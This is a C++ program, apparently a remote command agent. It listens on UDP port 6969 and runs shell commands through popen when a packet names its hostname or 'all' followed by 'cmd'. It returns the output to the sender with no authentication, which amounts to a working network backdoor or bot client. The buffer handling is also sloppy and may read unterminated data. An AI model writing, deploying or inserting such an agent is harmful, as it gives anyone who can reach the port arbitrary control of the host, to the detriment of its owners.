#include <fstream>
#include <cstring>
#include <netinet/in.h>
#include <string>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <vector>
#include <array>
#include <memory>

#define PORT 6969
#define BUFFER_SIZE 256

std::vector<std::string> split(std::string str){
	std::string word = "";
	std::vector<std::string> res;
	for(char c : str){
		if(c == ';'){
			res.push_back(word);
			word = "";
		}
		else{
			word += c;
		}
	}
	res.push_back(word);
	return res;
}

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, int(*)(FILE*)> pipe(popen(cmd, "r"), pclose);
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    if (!result.empty() && result.back() == '\n') {
        result.pop_back();
    }

    return result;
}

int main() {
    int sock;
    struct sockaddr_in broadcastAddr;
    char buffer[BUFFER_SIZE];

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        
        return -1;
    }

    memset(&broadcastAddr, 0, sizeof(broadcastAddr));
    broadcastAddr.sin_family = AF_INET;
    broadcastAddr.sin_addr.s_addr = INADDR_ANY;
    broadcastAddr.sin_port = htons(PORT);

    if (bind(sock, (struct sockaddr*)&broadcastAddr, sizeof(broadcastAddr)) < 0) {
        std::ofstream log("log", std::ios::out);
        log << "binding err";
        close(sock);
        return -1;
    }

    while (true) {
        socklen_t addrLen = sizeof(broadcastAddr);
        ssize_t bytesReceived = recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&broadcastAddr, &addrLen);
        if (bytesReceived > 0) {
            if(split((std::string)buffer)[0] == exec("hostname") || split((std::string)buffer)[0] == "all"){
                if(split((std::string)buffer)[1] == "cmd"){
                    std::string answ = exec(split((std::string)buffer)[2].c_str());
                    sendto(sock, answ.c_str(), answ.size(), 0, (struct sockaddr*)&broadcastAddr, addrLen);
                }
            }
            memset(buffer, 0, sizeof(buffer));
        }
    }

    close(sock);
    return 0;
}